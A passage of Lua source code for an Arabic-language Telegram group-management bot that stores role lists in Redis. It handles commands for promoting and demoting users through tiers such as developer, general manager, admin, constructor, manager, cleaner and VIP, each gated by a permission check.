if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevAbs:sadd(David..'Abs:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين")  
end
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and ChCheck(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and ChCheck(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevAbs:srem(David..'Abs:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
end end
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(David..'Abs:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAbs:sadd(David..'Abs:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbs:srem(David..'Abs:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end end
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(David..'Abs:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAbs:sadd(David..'Abs:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbs:srem(David..'Abs:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end end
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(David..'Abs:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAbs:sadd(David..'Abs:VipAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
end
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbs:srem(David..'Abs:VipAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end end
--  Set BasicConstructor  --
if ChatType == 'sp' or ChatType == 'gp'  then
if AbsConstructor(msg) then
if text ==('رفع منشئ اساسي') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbs:sadd(David..'Abs:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه منشئ اساسي")  
end
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbs:srem(David..'Abs:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not AbsConstructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر لمنشئ المجموعه والمطورين فقط', 1, 'md')
end
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAbs:sadd(David..'Abs:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
end
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAbs:srem(David..'Abs:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
end
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(David..'Abs:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير (%d+)')
DevAbs:sadd(David..'Abs:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء")  
end
--       Rem Manager      --
if text ==('تنزيل مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAbs:srem(David..'Abs:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
--       Set Cleaner      --
if text ==('رفع منظف') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(David..'Abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(David..'Abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and ChCheck(msg) then
local user = text:match('رفع منظف (%d+)')
DevAbs:sadd(David..'Abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
end
--       Rem Cleaner      --
if text ==('تنزيل منظف') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevAbs:srem(David..'Abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
end end
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbs:get(David.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbs:get(David.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and DevAbs:get(David.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(David..'Abs:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
end
--        Rem admin       --
if text ==('تنزيل ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAbs:srem(David..'Abs:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end end
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAbs:get(David.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(David..'Abs:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAbs:get(David.."Abs:Lock:ProSet"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من 
